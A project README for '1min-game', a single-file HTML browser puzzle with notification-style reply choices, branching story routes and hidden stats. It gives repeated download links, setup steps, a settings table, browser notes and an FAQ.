# 1min-game v1.0 - Game Script Utility 2026

> A browser-based one-minute message puzzle for HTML play. It revolves around reply buttons, notification-style prompts, and branching narrative routes that shift according to your choices.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-HTML%20browser-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-reed/1min-game-story-script?style=flat-square)](https://github.com/zack-reed/1min-game-story-script)

---

<p align="center">
  <a href="https://zack-reed.github.io/1min-game-story-script/">
    <img src="https://img.shields.io/badge/Download-1min-game%20Script-brightgreen?style=for-the-badge" alt="Download 1min-game Script">
  </a>
</p>

> **[Direct Download - 1min-game](https://zack-reed.github.io/1min-game-story-script/)**

---

[Download Latest Build](https://zack-reed.github.io/1min-game-story-script/)

---

## What this is

1min-game is a single-file HTML browser game built around rapid message-driven choices. The core loop is short-form reply interaction, where each selection can steer the conversation and send the story down a different path.

Its flow uses branching scenarios and worldline-style progression, plus hidden stats that may change after certain answers. A data-driven message card system keeps the dialogue structure tidy, which makes it straightforward to add scenarios, adjust reply options, and manage story branches inside one HTML file.

## Script capabilities

- Runs directly in an HTML browser as a single-file project
- Uses preset reply choices for quick message interactions
- Supports branching storylines based on player decisions
- Tracks hidden stats that can be affected by incorrect replies
- Unlocks new branches when stat thresholds are reached
- Organizes conversation flow through a data-driven message card system
- Includes storyline and worldline design notes for narrative planning
- Suited to short-session play centered on mobile-style notifications

## Getting started

1. Download the HTML file from the latest build link.
2. Save it to a local folder on your device.
3. Open the file in any modern HTML browser.
4. Start the game and use the reply buttons to move through the message puzzle.

Minimal example:

- `1min-game.html` -> open in browser -> select a reply -> follow the next message card

If you are packaging or embedding the game elsewhere, keep the single-file structure intact so the script logic and content remain together.

## Controls and options

The project leans on content-driven interactions instead of a large settings panel. At the script level, the main controls center on reply selection and progression through branches.

| Setting | Purpose |
| --- | --- |
| Reply buttons | Choose from preset responses in message scenes |
| Hidden stats | Record state changes from specific answers |
| Branch thresholds | Control when new paths become available |
| Message cards | Define conversation entries and outcomes |
| Single-file mode | Keep the full game in one HTML document |

## Browser support

This project is meant for HTML browser playback and is intended to function as a standalone single-file experience. It is best suited to modern desktop and mobile browsers that can open local HTML files.

Known limitations:
- Behavior depends on browser support for local HTML execution
- Visual layout and timing can vary between devices
- Content updates may require editing the source HTML directly

## FAQ

### How do I start it?
Download the HTML file and open it in a browser. No separate installer is required.

### Can I update the content?
Yes. Since the project is single-file HTML, updates usually mean replacing or editing that file with a newer build.

### Can I customize replies or story branches?
Yes. The reply system and branch logic are data-driven, so you can adjust choices, thresholds, and message flow in the source.

### Does it work on mobile?
It is built around a mobile notification style and should be usable in mobile browsers that support local HTML files.

### Where are the game assets stored?
The project is structured as a single HTML file, so the main logic and content are kept together rather than split across multiple files.

### What should I do if a branch does not appear?
Check the hidden stat conditions and reply sequence. Some paths only open after specific thresholds are reached.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
